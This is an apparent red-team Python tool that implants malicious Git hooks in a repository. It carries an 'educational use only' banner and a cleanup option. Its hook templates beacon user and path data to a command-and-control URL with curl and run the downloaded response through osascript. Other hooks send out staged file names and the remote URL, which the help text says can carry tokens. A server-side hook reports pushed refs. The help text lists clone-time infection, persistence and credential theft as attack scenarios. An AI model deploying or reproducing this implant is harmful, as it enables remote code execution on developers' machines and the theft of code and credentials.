#!/usr/bin/env python3
"""
RED TEAM DEMO - Git Hooks Implanter
=====================================
Demonstrates supply chain attacks via malicious Git hooks.

Attack Vectors:
1. post-checkout hook - Executes when repo is cloned/checked out
2. post-merge hook - Executes after git pull/merge
3. pre-commit hook - Executes before commits (can exfiltrate data)
4. pre-push hook - Executes before push (can steal credentials)

Usage:
    python3 git_implanter.py --repo /path/to/repo --hook post-checkout --c2 http://c2:8888
    python3 git_implanter.py --repo /path/to/repo --all --c2 http://c2:8888
    python3 git_implanter.py --repo /path/to/repo --cleanup

FOR EDUCATIONAL PURPOSES ONLY
"""

import argparse
import os
import stat
import sys
from datetime import datetime
from pathlib import Path

# ============================================================================
# CONFIGURATION
# ============================================================================

IMPLANT_MARKER = "# RED_TEAM_DEMO_IMPLANT"

# ============================================================================
# HOOK TEMPLATES
# ============================================================================

def generate_post_checkout_hook(c2_server: str) -> str:
    """
    post-checkout hook - Executes when:
    - Repository is cloned
    - Branch is switched
    - Files are checked out
    
    This is the PRIMARY attack vector for supply chain via git clone.
    """
    return f'''#!/bin/bash
{IMPLANT_MARKER}
# Executes on: git clone, git checkout

# Demo logging
mkdir -p /tmp/redteam_demo
echo "[GIT HOOK] post-checkout triggered at $(date)" >> /tmp/redteam_demo/git_hooks.log
echo "[GIT HOOK] Repo: $(pwd)" >> /tmp/redteam_demo/git_hooks.log
echo "[GIT HOOK] User: $(whoami)" >> /tmp/redteam_demo/git_hooks.log

# Beacon to C2
curl -s -X POST "{c2_server}/s/git_checkout" \\
    -d "p=macos&u=$(whoami)&a=$(date +%s),$(pwd | base64)" \\
    -o /tmp/.git_response.txt 2>/dev/null

# Execute response if AppleScript
if [ -f /tmp/.git_response.txt ] && grep -q "do shell script" /tmp/.git_response.txt 2>/dev/null; then
    osascript /tmp/.git_response.txt 2>/dev/null
    rm -f /tmp/.git_response.txt
fi

# Show demo notification
osascript -e 'display notification "post-checkout hook executed" with title "RED TEAM DEMO - Git Hook"' 2>/dev/null

exit 0
'''


def generate_post_merge_hook(c2_server: str) -> str:
    """
    post-merge hook - Executes when:
    - git pull completes
    - git merge completes
    
    Can be used for persistence - re-infects on every pull.
    """
    return f'''#!/bin/bash
{IMPLANT_MARKER}
# Executes on: git pull, git merge

mkdir -p /tmp/redteam_demo
echo "[GIT HOOK] post-merge triggered at $(date)" >> /tmp/redteam_demo/git_hooks.log

# Beacon
curl -s -X POST "{c2_server}/s/git_merge" \\
    -d "p=macos&u=$(whoami)&a=$(date +%s)" \\
    -o /tmp/.git_response.txt 2>/dev/null

# Execute response
if [ -f /tmp/.git_response.txt ] && grep -q "do shell script" /tmp/.git_response.txt 2>/dev/null; then
    osascript /tmp/.git_response.txt 2>/dev/null
fi

osascript -e 'display notification "post-merge hook executed" with title "RED TEAM DEMO - Git Hook"' 2>/dev/null

exit 0
'''


def generate_pre_commit_hook(c2_server: str) -> str:
    """
    pre-commit hook - Executes before every commit.
    
    Can be used to:
    - Exfiltrate code being committed
    - Steal secrets from staged files
    - Inject code into commits
    """
    return f'''#!/bin/bash
{IMPLANT_MARKER}
# Executes on: git commit (before commit is created)

mkdir -p /tmp/redteam_demo
echo "[GIT HOOK] pre-commit triggered at $(date)" >> /tmp/redteam_demo/git_hooks.log

# Capture staged file list (exfiltration demo)
STAGED_FILES=$(git diff --cached --name-only | base64)

# Beacon with staged files info
curl -s -X POST "{c2_server}/s/git_precommit" \\
    -d "p=macos&u=$(whoami)&a=$STAGED_FILES" 2>/dev/null

# Log for demo visibility
echo "[GIT HOOK] Staged files captured" >> /tmp/redteam_demo/git_hooks.log

# Always allow commit (stealth)
exit 0
'''


def generate_pre_push_hook(c2_server: str) -> str:
    """
    pre-push hook - Executes before git push.
    
    Can be used to:
    - Capture remote URL (credential theft)
    - Exfiltrate repo contents
    - Block pushes to certain remotes
    """
    return f'''#!/bin/bash
{IMPLANT_MARKER}
# Executes on: git push (before push completes)

mkdir -p /tmp/redteam_demo
echo "[GIT HOOK] pre-push triggered at $(date)" >> /tmp/redteam_demo/git_hooks.log

# Capture remote info
REMOTE_URL=$(git remote get-url origin 2>/dev/null | base64)

# Beacon with remote info
curl -s -X POST "{c2_server}/s/git_prepush" \\
    -d "p=macos&u=$(whoami)&a=$REMOTE_URL" 2>/dev/null

echo "[GIT HOOK] Remote URL captured" >> /tmp/redteam_demo/git_hooks.log

# Always allow push (stealth)
exit 0
'''


def generate_post_receive_hook(c2_server: str) -> str:
    """
    post-receive hook - SERVER SIDE hook.
    Executes on the Git server after receiving a push.
    
    This would be placed on a compromised Gitea/GitLab/GitHub Enterprise server.
    """
    return f'''#!/bin/bash
{IMPLANT_MARKER}
# SERVER-SIDE HOOK - Executes on git server after receiving push

mkdir -p /tmp/redteam_demo
echo "[GIT SERVER HOOK] post-receive triggered at $(date)" >> /tmp/redteam_demo/git_hooks.log

# Read pushed refs
while read oldrev newrev refname; do
    # Beacon with push info
    curl -s -X POST "{c2_server}/s/git_receive" \\
        -d "p=server&u=$(whoami)&a=$refname,$newrev" 2>/dev/null
    
    echo "[GIT SERVER HOOK] Received push to $refname" >> /tmp/redteam_demo/git_hooks.log
done

exit 0
'''


HOOK_GENERATORS = {
    'post-checkout': generate_post_checkout_hook,
    'post-merge': generate_post_merge_hook,
    'pre-commit': generate_pre_commit_hook,
    'pre-push': generate_pre_push_hook,
    'post-receive': generate_post_receive_hook,
}


# ============================================================================
# IMPLANT FUNCTIONS
# ============================================================================

def find_git_repo(path: str) -> Path:
    """Find .git directory"""
    p = Path(path).resolve()
    
    # Check if path is a .git directory
    if p.name == '.git' and p.is_dir():
        return p
    
    # Check if path contains .git
    git_dir = p / '.git'
    if git_dir.is_dir():
        return git_dir
    
    # Search parent directories
    for parent in p.parents:
        git_dir = parent / '.git'
        if git_dir.is_dir():
            return git_dir
    
    raise FileNotFoundError(f"No .git directory found in {path}")


def backup_hook(hooks_dir: Path, hook_name: str) -> Path:
    """Backup existing hook if present"""
    hook_path = hooks_dir / hook_name
    
    if hook_path.exists():
        backup_path = hook_path.with_suffix('.backup')
        if not backup_path.exists():
            hook_path.rename(backup_path)
            print(f"[+] Backed up existing hook: {backup_path}")
            return backup_path
    
    return None


def install_hook(hooks_dir: Path, hook_name: str, c2_server: str) -> bool:
    """Install a malicious hook"""
    
    if hook_name not in HOOK_GENERATORS:
        print(f"[!] Unknown hook type: {hook_name}")
        return False
    
    hooks_dir.mkdir(parents=True, exist_ok=True)
    hook_path = hooks_dir / hook_name
    
    # Check if already implanted
    if hook_path.exists():
        content = hook_path.read_text()
        if IMPLANT_MARKER in content:
            print(f"[!] Hook already implanted: {hook_name}")
            return False
    
    # Backup existing hook
    backup_hook(hooks_dir, hook_name)
    
    # Generate and write hook
    generator = HOOK_GENERATORS[hook_name]
    hook_content = generator(c2_server)
    
    hook_path.write_text(hook_content)
    
    # Make executable
    hook_path.chmod(hook_path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    
    print(f"[+] Installed hook: {hook_path}")
    return True


def cleanup_hooks(hooks_dir: Path, hook_names: list = None) -> bool:
    """Remove implanted hooks and restore backups"""
    
    if hook_names is None:
        hook_names = list(HOOK_GENERATORS.keys())
    
    for hook_name in hook_names:
        hook_path = hooks_dir / hook_name
        backup_path = hook_path.with_suffix('.backup')
        
        if hook_path.exists():
            content = hook_path.read_text()
            if IMPLANT_MARKER in content:
                hook_path.unlink()
                print(f"[+] Removed implanted hook: {hook_name}")
                
                # Restore backup
                if backup_path.exists():
                    backup_path.rename(hook_path)
                    print(f"[+] Restored backup: {hook_name}")
    
    return True


# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='RED TEAM DEMO - Git Hooks Implanter',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
    # Install post-checkout hook (triggers on clone)
    python3 git_implanter.py --repo /path/to/repo --hook post-checkout --c2 http://localhost:8888
    
    # Install all hooks
    python3 git_implanter.py --repo /path/to/repo --all --c2 http://localhost:8888
    
    # Cleanup
    python3 git_implanter.py --repo /path/to/repo --cleanup

Available hooks:
    post-checkout  - Triggers on git clone, git checkout
    post-merge     - Triggers on git pull, git merge  
    pre-commit     - Triggers before git commit (can exfiltrate staged files)
    pre-push       - Triggers before git push (can capture remote URLs)
    post-receive   - SERVER-SIDE hook (for compromised git servers)

Attack scenarios:
    1. Clone-time infection: post-checkout runs when victim clones malicious repo
    2. Pull-time persistence: post-merge re-infects on every pull
    3. Data exfiltration: pre-commit captures code being committed
    4. Credential theft: pre-push captures remote URLs with tokens
        '''
    )
    
    parser.add_argument('--repo', '-r', required=True,
                       help='Path to git repository')
    parser.add_argument('--hook', '-H',
                       choices=list(HOOK_GENERATORS.keys()),
                       help='Hook to install')
    parser.add_argument('--all', '-a', action='store_true',
                       help='Install all hooks')
    parser.add_argument('--c2', '-c', default='http://localhost:8888',
                       help='C2 server URL')
    parser.add_argument('--cleanup', action='store_true',
                       help='Remove implanted hooks')
    parser.add_argument('--list', '-l', action='store_true',
                       help='List installed hooks')
    
    args = parser.parse_args()
    
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║              RED TEAM - Git Hooks Implanter                  ║
    ║                                                              ║
    ║    Supply Chain Attack via Malicious Git Hooks               ║
    ╠══════════════════════════════════════════════════════════════╣
    ║                 FOR EDUCATIONAL USE ONLY                     ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    try:
        git_dir = find_git_repo(args.repo)
        hooks_dir = git_dir / 'hooks'
        
        print(f"[*] Git repository: {git_dir.parent}")
        print(f"[*] Hooks directory: {hooks_dir}")
        
        if args.list:
            print("\n[*] Checking installed hooks:")
            for hook_name in HOOK_GENERATORS.keys():
                hook_path = hooks_dir / hook_name
                if hook_path.exists():
                    content = hook_path.read_text()
                    if IMPLANT_MARKER in content:
                        print(f"    [IMPLANTED] {hook_name}")
                    else:
                        print(f"    [EXISTS] {hook_name}")
                else:
                    print(f"    [MISSING] {hook_name}")
            return 0
        
        if args.cleanup:
            cleanup_hooks(hooks_dir)
            print("\n[+] Cleanup complete!")
            return 0
        
        if not args.hook and not args.all:
            print("[!] Specify --hook or --all")
            return 1
        
        hooks_to_install = list(HOOK_GENERATORS.keys()) if args.all else [args.hook]
        
        print(f"\n[*] Installing hooks with C2: {args.c2}")
        
        for hook_name in hooks_to_install:
            install_hook(hooks_dir, hook_name, args.c2)
        
        print("\n" + "="*60)
        print("[+] IMPLANT SUCCESSFUL!")
        print("="*60)
        print(f"    Repository: {git_dir.parent}")
        print(f"    Hooks installed: {', '.join(hooks_to_install)}")
        print(f"    C2 Server: {args.c2}")
        print()
        print("    Attack triggers:")
        if 'post-checkout' in hooks_to_install:
            print("    - git clone <this-repo>")
            print("    - git checkout <branch>")
        if 'post-merge' in hooks_to_install:
            print("    - git pull")
        if 'pre-commit' in hooks_to_install:
            print("    - git commit")
        if 'pre-push' in hooks_to_install:
            print("    - git push")
        print()
        print("    To cleanup: python3 git_implanter.py --repo ... --cleanup")
        print("="*60)
        
    except FileNotFoundError as e:
        print(f"[!] Error: {e}")
        return 1
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        return 1
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
